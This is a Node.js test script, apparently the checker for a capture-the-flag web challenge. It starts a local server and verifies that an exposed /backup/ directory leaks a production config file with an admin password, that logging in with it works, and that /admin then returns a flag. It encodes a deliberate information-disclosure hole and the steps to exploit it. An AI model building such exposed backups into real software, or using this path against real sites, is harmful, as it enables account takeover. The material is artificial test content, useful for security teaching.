const { spawn } = require("child_process");
const http = require("http");

const PORT = 4000;

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function httpGet(path) {
  return new Promise((resolve, reject) => {
    const req = http.get(
      {
        hostname: "127.0.0.1",
        port: PORT,
        path,
      },
      (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          resolve({ status: res.statusCode, headers: res.headers, body: data });
        });
      }
    );
    req.on("error", reject);
  });
}

function httpPostJson(path, jsonBody) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify(jsonBody);
    const req = http.request(
      {
        hostname: "127.0.0.1",
        port: PORT,
        path,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(body),
        },
      },
      (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          resolve({ status: res.statusCode, headers: res.headers, body: data });
        });
      }
    );
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

(async () => {
  console.log("Starting server on port", PORT);
  const server = spawn("node", ["index.js"], {
    env: { ...process.env, PORT: String(PORT) },
    stdio: "inherit",
  });

  try {
    // Give the server time to start
    await delay(1500);

    // 1) Check home page
    const home = await httpGet("/");
    if (home.status !== 200) {
      throw new Error(`Home page returned status ${home.status}`);
    }
    console.log("Home page OK");

    // 2) Check backup directory exposed
    const backupList = await httpGet("/backup/");
    if (backupList.status !== 200 || !backupList.body.includes("config-prod.yaml.bak")) {
      throw new Error("Backup directory not exposed or file missing");
    }
    console.log("Backup directory listing OK");

    // 3) Check backup config contents
    const backupFile = await httpGet("/backup/config-prod.yaml.bak");
    if (
      backupFile.status !== 200 ||
      !backupFile.body.includes("admin") ||
      !backupFile.body.includes("Very_Strong_Admin_Password_9fc1e2")
    ) {
      throw new Error("Backup config does not contain expected admin credentials");
    }
    console.log("Backup config file OK");

    // 4) Login with leaked credentials
    const loginResp = await httpPostJson("/login", {
      username: "superadmin",
      password: "Very_Strong_Admin_Password_9fc1e2",
    });

    if (loginResp.status !== 200) {
      throw new Error(`Login returned status ${loginResp.status}`);
    }

    let parsed;
    try {
      parsed = JSON.parse(loginResp.body);
    } catch (e) {
      throw new Error("Login response is not valid JSON");
    }
    if (!parsed.ok) {
      throw new Error("Login failed according to response JSON");
    }

    const setCookie = loginResp.headers["set-cookie"];
    if (!setCookie || !setCookie[0]) {
      throw new Error("No Set-Cookie header returned from login");
    }
    const cookieHeader = setCookie[0].split(";")[0];

    console.log("Login OK, cookie:", cookieHeader);

    // 5) Access /admin with cookie
    const adminPage = await new Promise((resolve, reject) => {
      const req = http.request(
        {
          hostname: "127.0.0.1",
          port: PORT,
          path: "/admin",
          method: "GET",
          headers: {
            Cookie: cookieHeader,
          },
        },
        (res) => {
          let data = "";
          res.on("data", (chunk) => (data += chunk));
          res.on("end", () => {
            resolve({
              status: res.statusCode,
              headers: res.headers,
              body: data,
            });
          });
        }
      );
      req.on("error", reject);
      req.end();
    });

    if (adminPage.status !== 200 || !adminPage.body.includes("flag{")) {
      throw new Error("Admin page did not return flag");
    }

    console.log("Admin page OK, flag is present.");
    console.log("All tests passed.");
    server.kill();
    process.exit(0);
  } catch (err) {
    console.error("TEST FAILED:", err);
    server.kill();
    process.exit(1);
  }
})();
